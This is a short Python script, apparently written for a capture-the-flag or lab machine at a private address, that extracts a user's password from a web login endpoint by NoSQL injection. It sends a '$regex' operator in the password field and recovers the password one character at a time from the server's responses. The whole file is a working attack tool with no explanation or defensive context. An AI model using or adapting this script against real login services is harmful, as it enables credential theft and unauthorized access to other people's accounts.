#!/usr/bin/env python3

import requests
import string
import sys


user = sys.argv[1]
password = ''
found = False

while not found:
    for c in string.ascii_letters + string.digits + '!@#$%^&,':
        print(f'\r{password}{c:<50}', end='')
        payload = { 'user': user,
                    'password':
                       { '$regex' : f'^{password}{c}' },
                  }
        resp = requests.post('http://10.10.11.139:5000/login', json=payload)

        if not 'Invalid Password' in resp.text:
            payload = {'user': user, 'password': password + c}
            resp = requests.post('http://10.10.11.139:5000/login', json=payload)
            password += c
            if not 'Invalid Password' in resp.text:
                print(f'\r{password}')
                found = True
            break
